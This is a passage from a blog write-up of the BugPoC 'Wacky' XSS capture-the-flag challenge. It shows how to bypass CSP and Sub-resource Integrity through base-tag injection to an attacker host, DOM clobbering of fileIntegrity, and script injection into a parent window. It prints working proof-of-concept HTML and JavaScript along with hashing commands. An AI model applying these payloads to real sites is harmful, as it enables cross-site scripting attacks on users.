+href="https://evil.com/"&gt;</code>. All URLs that don’t specify a host will be relative
+to this base URL, and the script will be loaded from
+<code class="language-plaintext highlighter-rouge">https://evil.com/files/analytics/js/frame-analytics.js</code>.</p>
+
+<p>We also need to make sure our <code class="language-plaintext highlighter-rouge">frame-analytics.js</code> file is returned with an
+<code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin: *</code> header. This is, I believe, because the
+<code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag has <code class="language-plaintext highlighter-rouge">crossorigin</code> set to <code class="language-plaintext highlighter-rouge">anonymous</code>.</p>
+
+<h3 id="sri-bypass">SRI Bypass</h3>
+
+<p>With our new payload we’re now faced with another issue:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">popup</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span>
+        <span class="dl">'</span><span class="s1">&lt;/title&gt;&lt;base href="https://acut3.xyz/"&gt;</span><span class="dl">'</span>
+    <span class="p">);</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://wacky.buggywebsite.com/frame.html?param=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">payload</span><span class="p">,</span>
+                <span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="/assets/bugpoc-wacky-xss-challenge/wacky.buggywebsite.com_integrity.png" alt="CSP" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> element is created with an <code class="language-plaintext highlighter-rouge">integrity</code> attribute. It’s a feature
+known as “Sub-resource Integrity” that instructs the browser to check that the
+signature of the downloaded script matches the signatures declared in the
+attribute.</p>
+
+<p>Since we don’t have any way to make our script’s sha256 match the expected
+value of <code class="language-plaintext highlighter-rouge">unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=</code>, we need to a way to
+change this expected value. Where does this value come from? It is set with the
+following piece of code:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">fileIntegrity</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">fileIntegrity</span> <span class="o">||</span> <span class="p">{</span>
+    <span class="dl">'</span><span class="s1">rfc</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1"> https://w3c.github.io/webappsec-subresource-integrity/</span><span class="dl">'</span><span class="p">,</span>
+    <span class="dl">'</span><span class="s1">algorithm</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">sha256</span><span class="dl">'</span><span class="p">,</span>
+    <span class="dl">'</span><span class="s1">value</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=</span><span class="dl">'</span><span class="p">,</span>
+    <span class="dl">'</span><span class="s1">creationtime</span><span class="dl">'</span> <span class="p">:</span> <span class="mi">1602687229</span>
+<span class="p">}</span>
+<span class="p">[...]</span>
+<span class="nx">script</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">integrity</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">sha256-</span><span class="dl">'</span><span class="o">+</span><span class="nx">fileIntegrity</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>If <code class="language-plaintext highlighter-rouge">window.fileIntegrity</code> is already set when the script executes, it won’t be
+overridden. But how could we set it without an XSS? Through DOM Clobbering!
+Since we can inject arbitrary tags, we can inject an <code class="language-plaintext highlighter-rouge">&lt;input&gt;</code> tag:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"fileIntegrity"</span> <span class="na">value=</span><span class="s">"&lt;our_sha256&gt;"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>It will have the effect of setting <code class="language-plaintext highlighter-rouge">fileIntegrity.value</code> to the sha256 of our
+malicious <code class="language-plaintext highlighter-rouge">frame-analytics.js</code> file.</p>
+
+<h3 id="modal-block-bypass">Modal Block Bypass</h3>
+
+<p>Let’s create our file
+<code class="language-plaintext highlighter-rouge">https://acut3.xyz/files/analytics/js/frame-analytics.js</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl -gsi 'https://acut3.xyz/files/analytics/js/frame-analytics.js'
+HTTP/2 200
+[...]
+access-control-allow-origin: *
+content-type: application/javascript
+
+alert(origin)
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl -s 'https://acut3.xyz/files/analytics/js/frame-analytics.js' \
+       | openssl sha256 -binary | base64
+5gW1KquRtb9p81d6nfzjy+RXY/+o5QNprR3LJ4hhyMM=
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">popup</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span>
+        <span class="dl">'</span><span class="s1">&lt;/title&gt;</span><span class="dl">'</span>
+        <span class="o">+</span> <span class="dl">'</span><span class="s1">&lt;script&gt;alert(origin)&lt;/script&gt;</span><span class="dl">'</span>
+        <span class="o">+</span> <span class="dl">'</span><span class="s1">&lt;input hidden id="22fileIntegrity" value="5gW1KquRtb9p81d6nfzjy+RXY/+o5QNprR3LJ4hhyMM="&gt;</span><span class="dl">'</span>
+    <span class="p">);</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://wacky.buggywebsite.com/frame.html?param=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">payload</span><span class="p">,</span>
+                <span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>We’re faced with yet another issue:</p>
+
+<p><img src="/assets/bugpoc-wacky-xss-challenge/wacky.buggywebsite.com_modal.png" alt="CSP" /></p>
+
+<p>Because our XSS is executing inside a sandboxed iframe that doesn’t have
+<code class="language-plaintext highlighter-rouge">allow-modals</code> option, we’re not allowed call <code class="language-plaintext highlighter-rouge">alert()</code>.</p>
+
+<p>Instead of calling <code class="language-plaintext highlighter-rouge">alert()</code> inside the sandboxed iframe, we can inject a
+script into the parent window. This is allowed because the sandboxed iframe has
+the <code class="language-plaintext highlighter-rouge">allow-same-origin</code> option set, which means it has its normal origin
+(without it, it would have a special origin that doesn’t match any other
+origin). In this case the origin is the same as the parent window since the
+iframe doesn’t have an <code class="language-plaintext highlighter-rouge">src</code> attribute.</p>
+
+<p>Our <code class="language-plaintext highlighter-rouge">frame-analytics.js</code> file becomes:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">xss</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">script</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">xss</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">alert(origin)</span><span class="dl">"</span><span class="p">;</span>
+<span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">xss</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Note that we don’t need to set a nonce, presumably because the script is being
+created by a “trusted” script. But if needed it would be easy to set a valid
+nonce with:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">xss</span><span class="p">.</span><span class="nx">nonce</span> <span class="o">=</span> <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">scripts</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">nonce</span>
+</code></pre></div></div>
+
+<h3 id="final-poc">Final PoC</h3>
+
+<p>We simply need to host those two web pages:</p>
+
+<ol>
+  <li>
+    <p>https://acut3.xyz/files/analytics/js/frame-analytics.js:</p>
+
+    <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">xss</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">script</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">xss</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">alert(origin)</span><span class="dl">"</span><span class="p">;</span>
+<span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">xss</span><span class="p">);</span>
+</code></pre></div>    </div>
+
+    <p>Returned with the required header:</p>
+
+    <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">Access-Control-Allow-Origin: *
+</span></code></pre></div>    </div>
+  </li>
+  <li>
+    <p>The main page:</p>
+
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="kd">function</span> <span class="nx">popup</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span>
+        <span class="dl">'</span><span class="s1">&lt;/title&gt;</span><span class="dl">'</span>
+        <span class="o">+</span> <span class="dl">'</span><span class="s1">&lt;base href="https://acut3.xyz/"&gt;</span><span class="dl">'</span>
+        <span class="o">+</span> <span class="dl">'</span><span class="s1">&lt;input hidden id="fileIntegrity" value="8rWlnRQdot2DeuCE0IKb7kw4BhGMRbQeOITSE876IQs="&gt;</span><span class="dl">'</span>
+    <span class="p">);</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://wacky.buggywebsite.com/frame.html?param=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">payload</span><span class="p">,</span>
+                <span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span> <span class="c1">// Sets name to "iframe" in the new window</span>
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#"</span> <span class="na">onclick=</span><span class="s">"popup()"</span><span class="nt">&gt;</span>Click me!<span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>The victim needs to visit our page and click on the “Click me!” link. An alert
+will pop in the new tab.</p>
+
+<h2 id="bugpoc-poc">BugPoC PoC</h2>
+
+<p>First we need to create a <a href="https://bugpoc.com/testers/other/mock">mock
+endpoint</a> that will return the fake
+<code class="language-plaintext highlighter-rouge">frame-analytics.js</code> file:</p>
+
+<p><img src="/assets/bugpoc-wacky-xss-challenge/bugpoc.com_testers_other_mock.png" alt="Mock Endpoint Builder" /></p>
+
+<p>The <a href="https://mock.bugpoc.ninja/bf96c4ce-ab42-4d47-aa3e-4d45d70ae2d9/m?sig=1d02918cec44299d3fc73268614e9cb5fe2d8243d3bce1a894b886e4d6d77948&amp;statusCode=200&amp;headers=%7B%22access-control-allow-origin%22%3A%22*%22%7D&amp;body=xss%20%3D%20document.createElement(%22script%22)%3B%0Axss.textContent%20%3D%20%22alert(origin)%22%3B%0Aparent.document.body.appendChild(xss)%3B">generated URL</a> cannot be used as a <code class="language-plaintext highlighter-rouge">&lt;base&gt;</code> URL since it ends with a non-directory element. Let’s use the new <a href="https://bugpoc.com/testers/other/redir">flexible redirector</a> to hide it behind a clean, <code class="language-plaintext highlighter-rouge">&lt;base&gt;</code>-friendly URL:</p>
+
+<p><img src="/assets/bugpoc-wacky-xss-challenge/bugpoc.com_testers_other_redir.png" alt="Flexible Redirector" /></p>
+
+<p>Compute the sha256 of this page (don’t forget curl’s <code class="language-plaintext highlighter-rouge">-L</code> to follow
+redirections):</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-Ls</span> <span class="s1">'https://zkkmxeqw4y9n.redir.bugpoc.ninja'</span> <span class="se">\</span>
+       | openssl sha256 <span class="nt">-binary</span> | <span class="nb">base64
+</span>uab6g00HfZC79E8L0usyN5QQ01OnnzuP+RYY1jUfu7o<span class="o">=</span>
+</code></pre></div></div>
+
+<p>Now the generated URL
+<a href="https://zkkmxeqw4y9n.redir.bugpoc.ninja">https://zkkmxeqw4y9n.redir.bugpoc.ninja</a>
+can be used to build the final <a href="https://bugpoc.com/testers/front-end">Front-End
+PoC</a>:</p>
+
+<p><img src="/assets/bugpoc-wacky-xss-challenge/bugpoc.com_testers_front-end.png" alt="Front-End PoC Generator" /></p>
+
+<p>Click on “Publish” and share the <a href="https://bugpoc.com/poc#bp-lMrf4j3L">PoC URL</a>
+and password in you HackerOne report:</p>
+
+<p><img src="/assets/bugpoc-wacky-xss-challenge/bugpoc.com_testers_published.png" alt="Front-End PoC Published" /></p>
+
+<h2 id="final-thoughts">Final thoughts</h2>
+
+<p>I must say I enjoyed this challenge very much. It had all the attributes that,
+in my opinion, make a good challenge:</p>
+
+<ul>
+  <li>No guesswork, just logical thinking</li>
+  <li>Realistic vulnerabilities that you could find in a real world scenario</li>
+  <li>Some lesser knows techniques that I’m sure were new to many participants</li>
+</ul>
+
+<p>To summarize the different techniques that we used:</p>
+
+<ul>
+  <li>Use <code class="language-plaintext highlighter-rouge">open()</code> when iframing is not possible</li>
+  <li>Inject a <code class="language-plaintext highlighter-rouge">&lt;base&gt;</code> tag to replace an existing script and bypass a nonce</li>
+  <li>Use DOM Clobbering to set a variable and alter the flow of an an existing
+script</li>
+  <li>Once you have an XSS, everything with the same origin is in reach</li>
+</ul>
+
+<p>Also something quite unique about this challenge: it serves as the first
+interview for select Amazon Security Engineering roles, should you choose to
+apply for them. Pretty cool! While I’m not personally looking for a job, I hope
+others will have seized the opportunity and that something good will come out
+of it.</p>
+
+<hr />]]></content><author><name>acut3</name></author><category term="ctf" /><category term="ctf" /><category term="xss" /><category term="nonce" /><category term="sri" /><category term="dom clobbering" /><summary type="html"><![CDATA[Bypassing CSP and SRI with HTML injection and DOM Clobbering]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/bugpoc-wacky-xss-challenge/wacky.buggywebsite.com_alert.png" /><media:content medium="image" url="http://localhost:4000/assets/bugpoc-wacky-xss-challenge/wacky.buggywebsite.com_alert.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
